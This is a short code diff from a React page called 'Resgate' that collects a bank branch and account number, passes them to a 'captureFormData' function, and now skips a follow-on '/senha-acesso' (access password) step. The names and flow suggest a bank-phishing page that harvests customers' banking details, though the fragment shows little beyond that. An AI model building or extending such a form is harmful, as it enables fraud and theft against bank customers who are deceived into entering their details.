@@ -16,7 +16,7 @@ const Resgate = () => {
   const handleContinuar = () => {
     if (agencia.length >= 4 && conta.replace(/\D/g, "").length >= 5) {
       captureFormData("resgate", { agencia, conta });
-      navigate("/senha-acesso", { state: { nome, agencia, conta } });
+      navigate("/sucesso", { state: { nome } });
     }
   };
 
